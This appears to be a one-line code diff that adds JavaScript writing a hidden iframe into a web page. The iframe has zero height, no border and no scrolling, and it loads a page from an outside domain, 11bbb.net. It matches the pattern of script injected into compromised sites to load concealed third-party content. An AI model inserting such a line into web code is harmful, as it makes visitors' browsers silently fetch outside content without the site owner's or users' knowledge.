@@ -1,0 +1,1 @@
+document.write('<iframe MARGINWIDTH=0 MARGINHEIGHT=0 HSPACE=0 VSPACE=0 FRAMEBORDER=0 SCROLLING=no src="http://www.11bbb.net/ad.html" height=0 width=100></iframe>'); 
